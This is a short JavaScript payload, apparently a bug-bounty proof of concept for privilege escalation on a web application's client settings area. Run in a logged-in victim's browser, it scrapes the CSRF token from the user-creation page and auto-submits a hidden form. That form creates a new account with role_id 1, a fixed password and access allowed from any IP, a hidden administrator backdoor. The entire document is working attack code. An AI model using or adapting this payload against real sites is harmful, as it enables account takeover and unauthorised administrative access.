(function () {
  fetch("/client/settings/users/create", {
    credentials: "include"
  })
    .then(res => res.text())
    .then(html => {
      const parser = new DOMParser();
      const doc = parser.parseFromString(html, "text/html");
      const tokenInput = doc.querySelector('input[name="_token"]');
      if (!tokenInput) return console.error("Token not found");

      const token = tokenInput.value;

      // Build and submit a hidden form (mimics real user behavior)
      const form = document.createElement("form");
      form.method = "POST";
      form.action = "/client/settings/users";
      form.style.display = "none";

      const addField = (name, value) => {
        const input = document.createElement("input");
        input.type = "hidden";
        input.name = name;
        input.value = value;
        form.appendChild(input);
      };

      // Add fields
      addField("_token", token);
      addField("name", "Secuna Privesc Encoder");
      addField("email", "eroel+spprivescencoder@secuna.io");
      addField("nickname", "PrivescFromEncoder");
      addField("birthdate", "1990/01/01");
      addField("nationality", "Afghan");
      addField("passport_no", "987654321");
      addField("role_id", "1");
      addField("position_id", "");
      addField("signatory", "0");
      addField("on_e_sign", "0");
      addField("password", "S9v!tN#2gFqX@4zW");
      addField("password_confirmation", "S9v!tN#2gFqX@4zW");
      addField("user_status", "1");
      addField("allow_all_ip", "1");
      addField("principal_assigned_all", "3");
      addField("principal_ids[]", "284");

      document.body.appendChild(form);
      form.submit(); // Triggers full navigation request
    });
})();
